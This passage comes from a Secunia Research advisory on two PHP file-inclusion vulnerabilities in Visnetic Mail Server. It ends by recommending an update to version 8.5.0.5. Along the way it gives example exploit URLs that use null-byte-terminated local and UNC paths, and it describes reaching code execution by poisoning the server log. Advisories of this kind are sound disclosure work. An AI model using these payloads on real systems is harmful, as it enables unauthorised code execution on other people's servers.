3) Description of Vulnerability

Secunia Research has discovered two vulnerabilities in Visnetic Mail
Server, which can be exploited by malicious users and by malicious
people to disclose potentially sensitive information and to compromise
a vulnerable system.

1) Input passed to the "language" and "lang_settings" parameters in
"/accounts/inc/include.php" and "/admin/inc/include.php" isn't
properly sanitised by the "securepath()" function before being used to
include files. This can be exploited to include arbitrary files from
local resources on the Windows platform using full pathnames.  This
can further be exploited to execute arbitrary PHP code by injecting
the code into the mail server's log file and including it.

Example:
http://[host]:32000/admin/inc/include.php?
language=0&lang_settings[0][1]=c:\[file]%00

The vulnerability is related to #1 in:
SA17865

Successful exploitation allows execution of arbitrary PHP code on
a vulnerable server without requiring authentication.

2) Input passed to the "language" parameter in "/mail/settings.html"
isn't properly validated before being saved to the database. This can
be exploited in conjunction with overwrite of the "lang_settings"
variable, which isn't properly sanitised by the "validatefolder()"
function, to include arbitrary files from local resources using
full pathnames, and from remote Windows shared folders using UNC
pathnames.

Examples:
http://[host]:32000/mail/settings.html?
id=[current_id]&Save_x=1&language=TEST
http://[host]:32000/mail/index.html?
id=[curent_id]&lang_settings[TEST]=test;
&lang_settings[TEST]=test;c:\[file]%00;
http://[host]:32000/mail/index.html
?id=[curent_id]&lang_settings[TEST]=test;
&lang_settings[TEST]=test;\\[host]\[share]\[file]%00;

Successful exploitation allows execution of arbitrary PHP code on a
vulnerable server but requires a valid logon.

The vulnerability is related to #3 in:
SA17865

====================================================================== 
4) Solution 

Update to version 8.5.0.5.
